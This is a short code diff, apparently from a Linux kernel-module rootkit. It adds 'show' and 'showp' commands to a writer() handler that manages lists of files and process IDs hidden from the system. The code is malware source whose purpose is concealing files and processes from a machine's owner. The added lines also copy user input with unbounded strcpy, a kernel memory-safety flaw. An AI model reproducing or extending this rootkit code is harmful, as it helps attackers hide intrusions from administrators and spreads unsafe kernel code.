@@ -41,6 +41,18 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             insert_node(&pids_to_hide, last_data);
         }
     }
+    if(memcmp("show ", tmpdata, strlen("show ")) == 0){
+        if(strlen(tmpdata) > strlen("show ") + 3){
+            strcpy(last_data, tmpdata + strlen("show "));
+            remove_node_by_name(&files_to_hide, last_data);
+        }
+    }
+    if(memcmp("showp ", tmpdata, strlen("showp ")) == 0){
+        if(strlen(tmpdata) > strlen("showp ")){
+            strcpy(last_data, tmpdata + strlen("showp "));
+            remove_node_by_name(&pids_to_hide, last_data);
+        }
+    }
     return 0;
 }
 
